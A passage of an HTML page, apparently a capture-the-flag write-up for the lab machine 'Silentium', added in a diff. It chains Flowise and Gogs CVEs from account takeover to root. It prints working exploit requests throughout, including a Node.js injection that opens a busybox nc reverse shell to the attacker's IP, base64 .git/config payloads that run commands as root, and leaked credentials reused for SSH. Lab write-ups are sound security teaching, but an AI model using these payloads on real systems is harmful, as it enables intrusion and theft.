+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
+
+                <p>Just two ports: SSH on 22 and an nginx web server on 80. The HTTP server redirects to
+                    <code>silentium.htb</code>, so I add it to <code>/etc/hosts</code>.</p>
+
+                <p>The main website appears to be a static landing page with no backend interaction:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">whatweb</span> http://silentium.htb</code></pre>
+
+                <pre><code class="language-plaintext">http://silentium.htb [200 OK] Country[RESERVED][ZZ], HTML5,
+HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], IP[10.129.28.46],
+Script, Title[Silentium | Institutional Capital &amp; Lending Solutions], nginx[1.24.0]</code></pre>
+
+                <p>Nothing useful there. I proceed with virtual host fuzzing to find subdomains:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">gobuster</span> vhost \
+  -u http://silentium.htb \
+  -w /usr/share/seclists/Discovery/DNS/combined_subdomains.txt \
+  -t 200 --append-domain --ne --xs 301 -r</code></pre>
+
+                <pre><code class="language-plaintext">staging.silentium.htb   Status: 200 [Size: 3142]</code></pre>
+
+                <p>I find the subdomain <code>staging.silentium.htb</code>, which hosts a
+                    <a href="https://github.com/flowiseai/flowise">Flowise</a> instance — an AI workflow
+                    automation platform.</p>
+
+                <h2>Flowise Enumeration — Version and User Discovery</h2>
+                <p>Flowise exposes the installed version unauthenticated at <code>/api/v1/version</code>:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">curl</span> http://staging.silentium.htb/api/v1/version</code></pre>
+
+                <pre><code class="language-json"><span style="color:#e5c07b;">{"version"</span>: <span style="color:#98c379;">"3.0.5"</span>}</code></pre>
+
+                <p>Version <strong>3.0.5</strong> has several known vulnerabilities. The most interesting is an
+                    authenticated RCE (<a href="https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-3gcm-f6qx-ff7p">CVE-2025-59528</a>),
+                    but it requires authentication. To authenticate I need a valid user account.</p>
+
+                <p>The <code>/api/v1/account/forgot-password</code> endpoint returns different responses based on
+                    whether an email exists, enabling user enumeration. Fuzzing with <code>wfuzz</code> at a single
+                    thread (to avoid 500 errors from endpoint overload) I discover user <code>ben</code>:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">wfuzz</span> -c \
+  -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
+  -X POST \
+  -u http://staging.silentium.htb/api/v1/account/forgot-password \
+  -H <span style="color:#98c379;">"Content-Type: application/json"</span> \
+  -d <span style="color:#98c379;">'{"user": {"email": "FUZZ@silentium.htb"}}'</span> \
+  -t 1 --hc 404</code></pre>
+
+                <pre><code class="language-plaintext">=====================================================================
+ID      Response   Lines  Word       Chars       Payload
+=====================================================================
+000000485:   201    0 L    1 W        579 Ch      "ben"</code></pre>
+
+                <p>The user's email is <code>ben@silentium.htb</code>.</p>
+
+                <h2>Account Takeover — CVE-2025-58434</h2>
+                <p><a href="https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-wgpv-6j63-x5ph">CVE-2025-58434</a>
+                    affects Flowise's password recovery flow. The
+                    <code>/api/v1/account/forgot-password</code> endpoint not only accepts the email address —
+                    it returns the generated <code>tempToken</code> directly in the API response, rather than
+                    sending it only via email. This allows anyone who knows a valid email to take over the
+                    account without mailbox access.</p>
+
+                <p>First I obtain the token by calling the forgot-password endpoint:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">curl</span> -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
+  -H <span style="color:#98c379;">"Content-Type: application/json"</span> \
+  -d <span style="color:#98c379;">'{"user": {"email": "ben@silentium.htb"}}'</span> | jq</code></pre>
+
+                <pre><code class="language-json">{
+  <span style="color:#e06c75;">"user"</span>: {
+    <span style="color:#e06c75;">"id"</span>: <span style="color:#98c379;">"e26c9d6c-678c-4c10-9e36-01813e8fea73"</span>,
+    <span style="color:#e06c75;">"name"</span>: <span style="color:#98c379;">"admin"</span>,
+    <span style="color:#e06c75;">"email"</span>: <span style="color:#98c379;">"ben@silentium.htb"</span>,
+    <span style="color:#e06c75;">"credential"</span>: <span style="color:#98c379;">"$2a$05$6o1ngPjXiRj.EbTK33PhyuzNBn2CLo8.b0lyys3Uht9Bfuos2pWhG"</span>,
+    <span style="color:#e06c75;">"tempToken"</span>: <span style="color:#98c379;">"4jYKhemtPMKU1ggD3hKe9iVwV9hMKxRi7veXovvcsdT6CsqN4MPxakremzzBBnPn"</span>,
+    <span style="color:#e06c75;">"tokenExpiry"</span>: <span style="color:#98c379;">"2026-04-12T11:22:00.937Z"</span>,
+    <span style="color:#e06c75;">"status"</span>: <span style="color:#98c379;">"active"</span>
+  },
+  <span style="color:#e06c75;">"organization"</span>: {},
+  <span style="color:#e06c75;">"organizationUser"</span>: {},
+  <span style="color:#e06c75;">"workspace"</span>: {},
+  <span style="color:#e06c75;">"workspaceUser"</span>: {},
+  <span style="color:#e06c75;">"role"</span>: {}
+}</code></pre>
+
+                <p>The response directly contains the <code>tempToken</code>. I use it against the
+                    <code>/api/v1/account/reset-password</code> endpoint to set a new password:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">curl</span> -X POST http://staging.silentium.htb/api/v1/account/reset-password \
+  -H <span style="color:#98c379;">"Content-Type: application/json"</span> \
+  -d <span style="color:#98c379;">'{"user": {"tempToken": "4Du0efFnPwYArB1t0VFcdvA8uU3FJck1zjpdqc8iP7kKZEj0PPZy3kWsxcBkzVHx", "email": "ben@silentium.htb", "password": "asd"}}'</span> | jq</code></pre>
+
+                <pre><code class="language-json">{
+  <span style="color:#e06c75;">"user"</span>: {
+    <span style="color:#e06c75;">"id"</span>: <span style="color:#98c379;">"e26c9d6c-678c-4c10-9e36-01813e8fea73"</span>,
+    <span style="color:#e06c75;">"name"</span>: <span style="color:#98c379;">"admin"</span>,
+    <span style="color:#e06c75;">"email"</span>: <span style="color:#98c379;">"ben@silentium.htb"</span>,
+    <span style="color:#e06c75;">"credential"</span>: <span style="color:#98c379;">"$2a$05$HuYiYdD1I4iosjC2Bkn7kefp9gL8icIaOp8CB09toWh6VAcLnzuA6"</span>,
+    <span style="color:#e06c75;">"tempToken"</span>: <span style="color:#98c379;">""</span>,
+    <span style="color:#e06c75;">"tokenExpiry"</span>: <span style="color:#98c379;">null</span>,
+    <span style="color:#e06c75;">"status"</span>: <span style="color:#98c379;">"active"</span>
+  },
+  <span style="color:#e06c75;">"organization"</span>: {},
+  <span style="color:#e06c75;">"organizationUser"</span>: {},
+  <span style="color:#e06c75;">"workspace"</span>: {},
+  <span style="color:#e06c75;">"workspaceUser"</span>: {},
+  <span style="color:#e06c75;">"role"</span>: {}
+}</code></pre>
+
+                <p>The <code>tempToken</code> is now empty and the credential hash has changed: the password reset
+                    succeeded. I now have access to Flowise with credentials
+                    <code>ben@silentium.htb</code> / <code>asd</code>.</p>
+
+                <h2>Flowise RCE — CVE-2025-59528</h2>
+                <p>With authenticated access, I exploit
+                    <a href="https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-3gcm-f6qx-ff7p">CVE-2025-59528</a>.
+                    This vulnerability allows arbitrary JavaScript execution on the server through the
+                    <code>/api/v1/node-load-method/customMCP</code> endpoint. The <code>mcpServerConfig</code>
+                    field in the request body is not properly sanitized, allowing injection and execution of
+                    arbitrary Node.js code directly in the Flowise process.</p>
+
+                <p>I first need to retrieve the API key from the web panel at
+                    <code>http://staging.silentium.htb/apikey</code>. With it, I verify code execution by
+                    sending a <code>curl</code> request back to my machine:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">curl</span> -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
+  -H <span style="color:#98c379;">"Content-Type: application/json"</span> \
+  -H <span style="color:#98c379;">"Authorization: Bearer hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc"</span> \
+  -d <span style="color:#98c379;">'{"loadMethod":"listActions","inputs":{"mcpServerConfig":"({x:(function(){const cp=process.mainModule.require(\"child_process\");cp.execSync(\"curl 10.10.14.208\");return 1;})()"}}}'</span> | jq</code></pre>
+
+                <pre><code class="language-json">[
+  {
+    <span style="color:#e06c75;">"label"</span>: <span style="color:#98c379;">"No Available Actions"</span>,
+    <span style="color:#e06c75;">"name"</span>: <span style="color:#98c379;">"error"</span>,
+    <span style="color:#e06c75;">"description"</span>: <span style="color:#98c379;">"No available actions, please check your API key and refresh"</span>
+  }
+]</code></pre>
+
+                <p>The error response is expected per the PoC. What matters is that my HTTP server receives a
+                    request from the victim machine, confirming remote code execution:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">python3</span> -m http.server 80</code></pre>
+
+                <pre><code class="language-plaintext">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.129.28.24 - - "GET / HTTP/1.1" 200 -</code></pre>
+
+                <p>RCE confirmed. I send a reverse shell using <code>busybox nc</code>:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">curl</span> -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
+  -H <span style="color:#98c379;">"Content-Type: application/json"</span> \
+  -H <span style="color:#98c379;">"Authorization: Bearer hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc"</span> \
+  -d <span style="color:#98c379;">'{"loadMethod":"listActions","inputs":{"mcpServerConfig":"({x:(function(){const cp=process.mainModule.require(\"child_process\");cp.execSync(\"busybox nc 10.10.14.208 443 -e sh\");return 1;})()"}}}'</span> | jq</code></pre>
+
+                <h2>Inside the Container — Credential Leakage</h2>
+                <p>The shell lands inside a Docker container with limited resources. In <code>/tmp</code> there
+                    are a few files that appear to be left intentionally as part of the machine's design,
+                    indicating prior compromise:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">ls</span> -lah /tmp</code></pre>
+
+                <pre><code class="language-plaintext">total 20K
+drwxrwxrwt 1 root root 4.0K Apr  8 09:41 .
+drwxr-xr-x 1 root root 4.0K Apr 12 11:25 ..
+-rwxr-xr-x 1 root root   32 Jan 29 22:27 code.sh
+-rw-r--r-- 1 root root   42 Jan 29 22:31 rce.sh
+-rwxr-xr-x 1 root root   42 Jan 29 22:34 rev.sh</code></pre>
+
+                <p>Running <code>env</code> reveals the container's environment variables, which leak sensitive
+                    credentials injected at deployment time:</p>
+
+                <pre><code class="language-plaintext"><span style="color:#e06c75;">FLOWISE_PASSWORD</span>=F1l3_d0ck3r
+ALLOW_UNAUTHORIZED_CERTS=true
+NODE_VERSION=20.19.4
+HOSTNAME=c78c3cceb7ba
+YARN_VERSION=1.22.22
+<span style="color:#e06c75;">SMTP_PORT</span>=1025
+SHLVL=3
+PORT=3000
+HOME=/root
+<span style="color:#e06c75;">SENDER_EMAIL</span>=ben@silentium.htb
+PUPPETEER_EXECUTABLE_PATH=/usr/bin/chromium-browser
+JWT_ISSUER=ISSUER
+JWT_AUTH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
+LLM_PROVIDER=nvidia-nim
+<span style="color:#e06c75;">SMTP_USERNAME</span>=test
+SMTP_SECURE=false
+JWT_REFRESH_TOKEN_EXPIRY_IN_MINUTES=43200
+<span style="color:#e06c75;">FLOWISE_USERNAME</span>=ben
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+DATABASE_PATH=/root/.flowise
+JWT_TOKEN_EXPIRY_IN_MINUTES=360
+JWT_AUDIENCE=AUDIENCE
+SECRETKEY_PATH=/root/.flowise
+PWD=/
+<span style="color:#98c379;">SMTP_PASSWORD</span>=<span style="color:#98c379;">r04D!!_R4ge</span>
+NVIDIA_NIM_LLM_MODE=managed
+SMTP_HOST=mailhog
+JWT_REFRESH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
+SMTP_USER=test</code></pre>
+
+                <p>The variable <code>SMTP_PASSWORD=r04D!!_R4ge</code> is also the SSH password for user
+                    <code>ben</code> on the host. Testing it works, granting access and the user flag:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">ssh</span> ben@silentium.htb</code></pre>
+
+                <h2>Host Enumeration — Port 3001 and Gogs</h2>
+                <p>Once on the host, I enumerate locally listening ports:</p>
+
+                <pre><code class="language-plaintext">tcp  LISTEN 0  4096  127.0.0.1:3000    0.0.0.0:*
+tcp  LISTEN 0  4096  127.0.0.1:3001    0.0.0.0:*
+tcp  LISTEN 0  4096  127.0.0.54:53     0.0.0.0:*
+tcp  LISTEN 0  4096  127.0.0.1:1025    0.0.0.0:*
+tcp  LISTEN 0  4096  127.0.0.53%lo:53  0.0.0.0:*
+tcp  LISTEN 0  4096  127.0.0.1:44931   0.0.0.0:*
+tcp  LISTEN 0  4096  127.0.0.1:8025</code></pre>
+
+                <p>Port 3001 stands out. Combined with a <code>gogs</code> directory under <code>/opt</code>,
+                    I confirm it's a <a href="https://github.com/gogs/gogs">Gogs</a> instance. I check the
+                    version:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">/opt/gogs/gogs/gogs</span> --version</code></pre>
+
+                <pre><code class="language-plaintext">Gogs version 0.13.3</code></pre>
+
+                <p>Version <strong>0.13.3</strong> is vulnerable to
+                    <a href="https://github.com/gogs/gogs/security/advisories/GHSA-gg64-xxr9-qhjp">CVE-2025-64111</a>,
+                    an authenticated RCE that allows arbitrary command execution as the user running the Gogs
+                    process — in this case, <code>root</code>.</p>
+
+                <h2>Gogs RCE — CVE-2025-64111</h2>
+                <p>The vulnerability abuses a symlink attack combined with the Gogs contents API. The flow is:</p>
+
+                <ol>
+                    <li>Create a repository on Gogs and locally.</li>
+                    <li>Create a symlink pointing to <code>.git/config</code> and push it to the repository.</li>
+                    <li>Use the Gogs API to update the symlinked file's content, overwriting
+                        <code>.git/config</code> with attacker-controlled content containing an arbitrary
+                        <code>sshCommand</code> directive.</li>
+                    <li>When Gogs internally processes the repository and performs git operations over SSH,
+                        the injected command executes with Gogs process privileges.</li>
+                </ol>
+
+                <p>I register a new user on Gogs (open registration is enabled) and create a repository named
+                    <code>asd</code>. Then on the host I prepare the local repo and push the symlink:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">ln</span> -s .git/config link
+<span style="color:#61afef;">git</span> add link
+<span style="color:#61afef;">git</span> commit -m <span style="color:#98c379;">'add'</span> &amp;&amp; git push</code></pre>
+
+                <pre><code class="language-plaintext">[master (root-commit) 310c66e] add
+ 1 file changed, 1 insertion(+)
+ create mode 120000 link
+Enumerating objects: 3, done.
+Counting objects: 100% (3/3), done.
+Writing objects: 100% (3/3), 202 bytes | 202.00 KiB/s, done.
+Total 3 (delta 0), reused 0 (delta 0), pack-reused 0
+To http://localhost:3001/asd/asd.git
+ * [new branch]      master -> master</code></pre>
+
+                <p>The repository now contains <code>link</code>, a symlink to <code>.git/config</code>, visible
+                    in the Gogs web interface:</p>
+
+                <p><img src="./media/image1.png" alt="Gogs web interface showing the repository with the 'link' symlink pointing to .git/config successfully uploaded" /></p>
+
+                <p>I generate an access token in Gogs for API access, then send the request that overwrites the
+                    symlinked file (and therefore the repository's <code>.git/config</code>) with a malicious
+                    base64-encoded payload:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">curl</span> -X PUT http://localhost:3001/api/v1/repos/asd/asd/contents/link \
+  -H <span style="color:#98c379;">"Content-Type: application/json"</span> \
+  -H <span style="color:#98c379;">"Host: localhost:3001"</span> \
+  -H <span style="color:#98c379;">"Authorization: token e4a7c7a99bef9d3e591b5b2028d46069c87895a1"</span> \
+  -d <span style="color:#98c379;">'{"message":"message","committer":{"name":"test","email":"a@b.com"},"content":"W2NvcmVdCglyZXBvc2l0b3J5Zm9ybWF0dmVyc2lvbiA9IDAKCWZpbGVtb2RlID0gdHJ1ZQoJYmFyZSA9IGZhbHNlCglsb2dhbGxyZWZ1cGRhdGVzID0gdHJ1ZQoJaWdub3JlY2FzZSA9IHRydWUKCXByZWNvbXBvc2V1bmljb2RlID0gdHJ1ZQoJc3NoQ29tbWFuZCA9IHRvdWNoIC90bXAvYWJjCltyZW1vdGUgIm9yaWdpbiJdCgl1cmwgPSBzc2g6Ly9naXRAbG9jYWxob3N0L2RlbW8vdnVsLmdpdAoJZmV0Y2ggPSArcmVmcy9oZWFkcy8qOnJlZnMvcmVtb3Rlcy9vcmlnaW4vKgpbYnJhbmNoICJtYXN0ZXIiXQoJcmVtb3RlID0gb3JpZ2luCgltZXJnZSA9IHJlZnMvaGVhZHMvbWFzdGVy"}'</span></code></pre>
+
+                <pre><code class="language-json">{<span style="color:#e06c75;">"message"</span>:<span style="color:#98c379;">"Something went wrong, please check the server logs for more information."</span>,<span style="color:#e06c75;">"url"</span>:<span style="color:#98c379;">"https://github.com/gogs/docs-api"</span>}</code></pre>
+
+                <p>Despite the error message, the PoC succeeded. I verify by checking for the root-owned
+                    <code>/tmp/abc</code> file:</p>
+
+                <pre><code class="language-plaintext">-rw-r--r-- 1 root root 0 Apr 12 12:51 abc</code></pre>
+
+                <p>The base64 payload decodes to the following malicious <code>.git/config</code>, where the
+                    <code>sshCommand</code> key injects the command that executes when Gogs performs internal
+                    git operations:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">echo</span> <span style="color:#98c379;">"W2NvcmVdCglyZXBvc2l0b3J5Zm9ybWF0dmVyc2lvbiA9IDAKCWZpbGVtb2RlID0gdHJ1ZQoJYmFyZSA9IGZhbHNlCglsb2dhbGxyZWZ1cGRhdGVzID0gdHJ1ZQoJaWdub3JlY2FzZSA9IHRydWUKCXByZWNvbXBvc2V1bmljb2RlID0gdHJ1ZQoJc3NoQ29tbWFuZCA9IHRvdWNoIC90bXAvYWJjCltyZW1vdGUgIm9yaWdpbiJdCgl1cmwgPSBzc2g6Ly9naXRAbG9jYWxob3N0L2RlbW8vdnVsLmdpdAoJZmV0Y2ggPSArcmVmcy9oZWFkcy8qOnJlZnMvcmVtb3Rlcy9vcmlnaW4vKgpbYnJhbmNoICJtYXN0ZXIiXQoJcmVtb3RlID0gb3JpZ2luCgltZXJnZSA9IHJlZnMvaGVhZHMvbWFzdGVy"</span> | base64 -d</code></pre>
+
+                <pre><code class="language-ini"><span style="color:#e5c07b;">[core]</span>
+    <span style="color:#e06c75;">repositoryformatversion</span> = <span style="color:#98c379;">0</span>
+    <span style="color:#e06c75;">filemode</span> = <span style="color:#98c379;">true</span>
+    <span style="color:#e06c75;">bare</span> = <span style="color:#98c379;">false</span>
+    <span style="color:#e06c75;">logallrefupdates</span> = <span style="color:#98c379;">true</span>
+    <span style="color:#e06c75;">ignorecase</span> = <span style="color:#98c379;">true</span>
+    <span style="color:#e06c75;">precomposeunicode</span> = <span style="color:#98c379;">true</span>
+    <span style="color:#e06c75;">sshCommand</span> = <span style="color:#c678dd;">touch /tmp/abc</span>
+<span style="color:#e5c07b;">[remote "origin"]</span>
+    <span style="color:#e06c75;">url</span> = <span style="color:#98c379;">ssh://git@localhost/demo/vul.git</span>
+    <span style="color:#e06c75;">fetch</span> = <span style="color:#98c379;">+refs/heads/*:refs/remotes/origin/*</span>
+<span style="color:#e5c07b;">[branch "master"]</span>
+    <span style="color:#e06c75;">remote</span> = <span style="color:#98c379;">origin</span>
+    <span style="color:#e06c75;">merge</span> = <span style="color:#98c379;">refs/heads/master</span></code></pre>
+
+                <p>The <code>sshCommand</code> directive is what git uses as the SSH binary when connecting to
+                    remote repositories over SSH. By injecting it into the <code>.git/config</code> of a
+                    Gogs-managed repository, any internal operation Gogs performs against that repository using
+                    an SSH URL triggers the arbitrary command with the process's privileges.</p>
+
+                <h2>Privilege Escalation — SUID bit on bash</h2>
+                <p>With RCE confirmed, I modify the payload so the injected command is
+                    <code>chmod u+s /bin/bash</code> instead of <code>touch /tmp/abc</code>. I create a new
+                    repository (<code>xd</code>), repeat the symlink steps, and send the new request:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">curl</span> -X PUT http://localhost:3001/api/v1/repos/asd/xd/contents/link \
+  -H <span style="color:#98c379;">"Content-Type: application/json"</span> \
+  -H <span style="color:#98c379;">"Host: localhost:3001"</span> \
+  -H <span style="color:#98c379;">"Authorization: token e4a7c7a99bef9d3e591b5b2028d46069c87895a1"</span> \
+  -d <span style="color:#98c379;">'{"message":"message","committer":{"name":"test","email":"a@b.com"},"content":"W2NvcmVdCiAgICAgICAgcmVwb3NpdG9yeWZvcm1hdHZlcnNpb24gPSAwCiAgICAgICAgZmlsZW1vZGUgPSB0cnVlCiAgICAgICAgYmFyZSA9IGZhbHNlCiAgICAgICAgbG9nYWxscmVmdXBkYXRlcyA9IHRydWUKICAgICAgICBpZ25vcmVjYXNlID0gdHJ1ZQogICAgICAgIHByZWNvbXBvc2V1bmljb2RlID0gdHJ1ZQogICAgICAgIHNzaENvbW1hbmQgPSBjaG1vZCB1K3MgL2Jpbi9iYXNoCltyZW1vdGUgIm9yaWdpbiJdCiAgICAgICAgdXJsID0gc3NoOi8vZ2l0QGxvY2FsaG9zdC9kZW1vL3Z1bC5naXQKICAgICAgICBmZXRjaCA9ICtyZWZzL2hlYWRzLyo6cmVmcy9yZW1vdGVzL29yaWdpbi8qClticmFuY2ggIm1hc3RlciJdCiAgICAgICAgcmVtb3RlID0gb3JpZ2luCiAgICAgICAgbWVyZ2UgPSByZWZzL2hlYWRzL21hc3Rlcgo="}'</span></code></pre>
+
+                <p>I verify the SUID bit has been set on <code>/bin/bash</code>:</p>
+
+                <pre><code class="language-plaintext">-rwsrwxrwx 1 root root 1.4M Mar 31 2024 /bin/bash</code></pre>
+
+                <p>With the SUID bit active, I escalate privileges by running bash in privileged mode with
+                    <code>-p</code>, which preserves the EUID of the binary's owner (<code>root</code>):</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">bash</span> -p</code></pre>
+
+                <p>I get a root shell and retrieve the system flag.</p>
+            </div>
+
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
